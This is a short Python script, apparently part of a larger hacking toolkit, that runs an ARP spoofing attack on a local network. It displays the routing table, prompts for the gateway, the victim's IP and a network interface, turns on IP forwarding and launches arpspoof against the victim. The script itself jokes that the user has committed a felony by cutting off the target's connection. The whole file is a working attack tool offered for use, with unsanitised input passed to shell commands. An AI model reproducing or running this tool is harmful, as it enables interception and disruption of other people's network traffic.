import os
print(r"""
  ___                 _____                        __ 
 / _ \               /  ___|                      / _|
/ /_\ \ _ __  _ __   \ `--.  _ __    ___    ___  | |_ 
|  _  || '__|| '_ \   `--. \| '_ \  / _ \  / _ \ |  _|
| | | || |   | |_) | /\__/ /| |_) || (_) || (_) || |  
\_| |_/|_|   | .__/  \____/ | .__/  \___/  \___/ |_|  
             | |            | |                       
             |_|            |_|          

            """)


print(r"""
a) Start
b) Coming in the future

----------

q) Quit")
            """)

statement = input("").lower()

if statement == 'a':
    os.system('echo ''')
    print("For this attack to work, you must be on the same network and subnet as your target!")
    os.system('echo ''')
    os.system('echo ----------')
    os.system('route -n')
    os.system('echo ----------')

    print("Enter the network's Default Gateway (listed above)")
    defaultgateway = input("")

    os.system('echo ''')
    os.system('echo Enter Victim IP')
    victimip = input("")

    os.system('echo ''')
    os.system('echo Enter Your network interface name, ex wlan0, also listed above')

    interfacename = input("")
    os.system('echo ''')

    os.system('echo If you see Mac Addresses flying around, then congrats you commited a felony... and are now nuking your targets connection')
    os.system('echo ''')
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    os.system('arpspoof -i '+ interfacename + ' -t ' + victimip + ' -r '+ defaultgateway)
elif statement == 'q':
        exec(open('Modules/attack/Attack.py').read()) 

else:
    print ("Incorrect Option")